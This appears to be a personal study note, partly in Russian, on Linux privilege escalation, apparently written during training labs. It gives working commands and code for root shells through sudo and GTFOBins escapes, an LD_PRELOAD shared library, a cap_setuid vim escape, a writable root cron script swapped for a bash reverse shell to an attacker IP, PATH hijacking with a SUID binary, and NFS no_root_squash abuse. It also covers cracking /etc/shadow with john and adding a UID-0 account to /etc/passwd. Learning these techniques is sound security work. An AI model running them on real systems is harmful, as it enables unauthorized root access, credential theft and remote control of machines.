
[[Linux]] [[2025-09-20]] [[Scripts for Escalate]] 
**Goal: take information about system and find vectors of escalate privilege**  
## Оглавление
[[#Main commands for first steps]]
[[#Escalate from sudo]]
[[#Escalate with SUID files]]
[[#Linux capabilities]]
[[#Crontab usage]]
[[#Privilege from path - shit use in last]]
[[#NFS - privilege]]

---
#### Main commands for first steps

<mark style="background: #BBFABBA6;">System information:</mark>
```shell
hostname           # give information about hostname of pc

uname -a           # information about core useful for find exploits

cat /proc/version  # file with information about version of core and compilers

cat /etc/issue     # inform about distribut. but u musn't trust this information becouse local admins can change this file
```

<mark style="background: #BBFABBA6;">Process and enviroment:</mark>
```shell
ps         # inform about active process in the system

ps -A      # all process in system

ps aux     # detailed list

ps axjf    # tree of processes

env        # give information about enviroment and variabals, most useful PATH

history    # command history (maybe contains passwords)
```
<mark style="background: #D00C0CA6;">PATH</mark> - way where system storage a programs. Eample if in path will be strange way: tmp we can send exploit or special script and execute this
<mark style="background: #BBFABBA6;">Users and rules:</mark>
```shell
id                               # information about user, can give information avout groups and ways to explotatio

cat /etc/passwd | grep home      # give information about users passwords. more can give information of shell what can be used ( /bin/bash or /usr/sbin/nologin)

sudo -l                          # command with root what can be execute. if can use vim, nano, less, find, python, can use GTFOBins, Key: NOPASSWD - start without password
```


<mark style="background: #BBFABBA6;">Files and directories</mark>
```shell
ls -la     # see all files and dirs

find       # find something [[usage find in linux]]
```
 [[usage find in linux]]

<mark style="background: #BBFABBA6;">Network</mark>
```shell
ifconfig    # check network interfaces, give inform about VPN

ip route    # routes in network

netstat     # network connections, show opened port and active connections

```

<mark style="background: #BBFABBA6;">Privilages and vulnaburites</mark>
<mark style="background: #D00C0CA6;">SUID files</mark> - can run file from owner of file(often root), example:
```shell
find / -perms -u=s -type f 2>/dev/null          # find SUID files

find / -type f -perm -04000 -ls 2>/dev/null     # another way to find SUID files
```
 example: vim gives the way to open console with root:
 ```shell
 vim -c ":!/bin/sh"                         # example: vim with SUID → root shell
 ```

#### Escalate from sudo

1. <mark style="background: #BBFABBA6;">check sudo commands</mark> 
```shell
sudo -l  #give informations about command what can be used from sudo
```
<mark style="background: #FFF3A3A6;">example:</mark> (ALL) NOPASSWD: /usr/bin/find - u can start find with root whithout password
2.  #GTFOBins-  site with lifehacks about escalation
<mark style="background: #FFF3A3A6;">example</mark> if u have sudo find use:
```shell
sudo find . -exec /bin/sh \; -quit #example GTFOBins: find with sudo → root shell
```
 if sudo nmap: 
 ```shell
 sudo nmap --interactive # nmap interactive shell
 !sh                     # inside nmap → spawn shell
 ```
 if sudo vim:
 ```shell
 sudo vim -c ':!/bin/sh' # vim with sudo → root shell
 ```
3.   <mark style="background: #BBFABBA6;">Use applications functions</mark> 
If program hasnt got exploit u can use her functions <mark style="background: #FFF3A3A6;">exaple:</mark> we have apache 2 without exploit then we can use:
```shell
sudo apache2 -f /etc/shadow                    # in error will be part of file
```
3. <mark style="background: #BBFABBA6;"> LD_Preload</mark> - program what can helps to make library with .so
<mark style="background: #FFF3A3A6;">example:</mark>
<mark style="background: #FFF3A3A6;">first:</mark>  
```shell
sudo -l
```
 need find string: <mark style="background: #D2B3FFA6;">env_keep+=LD_PRELOAD</mark> in (ALL) NOPASSWD its mean what sudo dont clear LD_PRELOAD
<mark style="background: #FFF3A3A6;">second:</mark> need to write this code in file with **.c**  with code:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD"); // удаляем переменную, чтобы не зациклиться
    setgid(0);              // меняем GID на root
    setuid(0);              // меняем UID на root
    system("/bin/bash");    // запускаем bash от root
}
```
<mark style="background: #FFF3A3A6;">third: compile lib</mark>:
```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles  # compile .so library
```
<mark style="background: #FFF3A3A6;">fourth:</mark> start our programm:
```shell
sudo LD_PRELOAD=/home/username/shell.so find         # run find with injected library → root shell
```
how it works: sudo start find with root after `LD_PRELOAD` send lib to execute and first start `_init()` and start root bash
#### Escalate with SUID files 
find files with SUID: 
```
find / -perm -4000
```
1. <mark style="background: #BBFABBA6;">example</mark> with `nano`
read /etc/shadow and /etc/passwd, make copy on kali shadow.txt and passwd.txt after use `unshadow`:  
```shell
unshadow passwd.txt shadow.txt > pass.txt       # combine passwd + shadow
```
 and after use john: 
 ```shell
 john --wordlist=rockyou.txt pass.txt            # crack hashes with john
 ```
 after this manipulations we have passwords for users
2. <mark style="background: #BBFABBA6;">example with create new sudouser</mark> 
<mark style="background: #FFF3A3A6;">first step</mark>: its make a new hash of password:
```shell
openssl passwd -1 -salt xyz pass     # generate password hash for new user
```
<mark style="background: #FFF3A3A6;">second step</mark>: paste password in `/etc/passwd` через `nano` string must look so 
`mamotrax:$1$xyz$4LW3k2xQW.3aNf...:0:0:root:/root:/bin/bash`
user -> mamotrax
`0:0` -> UID annd GID root
`/bin/bash`-> gives root-shell
after this stepe u can log in `su mamotrax`
#### Linux capabilities
<mark style="background: #BBFABBA6;">capabilites</mark> - special flags which gives binar file special privilage without all root
how to find capabilites: 
```shell
getcap -r / 2>/dev/null   # find capabilities in system
find / -perm -4000 2>/dev/null
```
<mark style="background: #FFF3A3A6;">example</mark> with vim:
1. find whit vim use capability: 
 ```shell
getcap -r / 2>/dev/null
result:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
 ```
see vim and its mean what he can change UID -> we can wiil be root
2. 
   ```shell
   ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "sh", "-c", "reset ; exec sh")'
   ```
 `-c` -> when vim start do this command 
`:py3` -> do with python3
`os.setuid(0)` -> change UID on root
`os.execl("/bin/bash", "sh", "-c", "reset ; exec sh"))` -> open rootshell 
```shell
"/bin/bash"   # путь к исполняемому файлу (bash)
"sh"          # это argv[0], имя процесса (обычно совпадает с названием шелла)
"-c"          # опция для bash: выполнить следующую строку как команду
"reset ; exec sh"   # строка-команда, которую надо выполнить
```

#### Crontab usage
<mark style="background: #BBFABBA6;">cron</mark> - tool for planing processes, he is starting programs or scripts by time, every user can read crontab plans in `/etc/crontab`
<mark style="background: #D00C0CA6;">!!!Process</mark> what was planned from cron started from user whose in crontab. If in `/etc/crontab` will be root -> script start with root privilege
example 1
in file `/etc/crontab` we have the line: 
```shell
* * * * * root /home/alper/Desktop/backup.sh
```
* ``* * * * *`` - do script every minute
* ``root`` - start from root
* ``/home/alper/Desktop/backup.sh`` - do this script from root
file backup.sh:
```bash
#!/bin/bash
BACKUPTIME=`date +%b-%d-%y`
DESTINATION=/home/alper/Documents/backup-$BACKUPTIME.tar.gz
SOURCEFOLDER=/home/alper/Documents/commercial/prices.xls
tar -cpzf $DESTINATION $SOURCEFOLDER
```
script make a backup every minute with root plivilege but user `/alper` can change file 
open file and swap code on:
```bash 
#!/bin/bash
bash -i >& /dev/tcp/10.0.2.15/6666 0>&1
```
`bash -i` → start interective bash
 `>& /dev/tcp/Attacker_IP/Attacker_port` → make a TCP connection to attacker machine
 `0>&1` → связывает ввод/вывод.
 after this give exec flag
 ```shell
 chmod +x /home/usr/file.sh
 ```
 and its start TCP connection on our PC, after this use [[NetCat]] on attackerPC 
 ```shell
 nc -nlvp attacker port
 ```

after this we can see root-reverse-shell and use it

#### Privilege from path - shit use in last

<mark style="background: #BBFABBA6;">Idea:</mark> if in $path we have dir where we can write, for example `/tmp` we can change bina what execute programm with SUID -> our bin will be with root 

1 step 
Check PATH
```shell
echo $PATH
```
 now must find writebale dirs use next script
 ```shell
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 ```
 or with usr filter 
 ```shell
 find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
 ```
 if nothing iteresting we can export something new^-^
 ```shell
 export PATH=/tmp:$PATH
 ```
 after this path has got `/tmp`
 2 Make a false bin file in SUID 
 ```shell
 cd /tmp 
 echo "/bin/bash" > example # echo -e '#!/bin/bash\n/bin/bash' > example
 chmod +x example
 ```
 3 Make exploit with SUID
 Make file with nano example_exploit.c this code
 ```C
#include <unistd.h>
void main() {
    setuid(0);   // меняем UID на root
    setgid(0);   // меняем GID на root
    system("example"); // вызываем "exaple" (ищется через PATH)
}
 ```
 after need use gcc to build it
 ```shell
 gcc example_exploit.c -o exp -w
 chmod u+s exp
 ```

#### NFS - privilege
NFC - network File System - service for shared dir and files to network
configuration file: /etc/exports
option `no_root_squash` gives root from client be root on server

<mark style="background: #D00C0CA6;">Attack</mark>
1 Check exports
```shell
showmount -e target_IP
```
`showmount` - gives information about NFS-share on server
`-e` - ecsport dirs
2 make a dir on attack machine
```shell
mount -o rw target_IP:/exampleFolder /tmp/BackUpOnAttackerMachine
```
`mount` - connect NFS
`-o rw` with read and write rights
`target_IP:/SharedFolderOnServ` - folder on server
`/tmp/BackUpOnAttackerMachine` - where will be shared folder on attacker PC
now everthing what we will create in `/tmp/BackUpOnAttackerMachine` will be in targetmachine

<mark style="background: #D00C0CA6;">if ur user no root use this</mark>
 ```shell
 sudo chown root:root fileName
 sudo chmod +s fileName
 ``` 
and this owner of file will be root and will be SUID flag S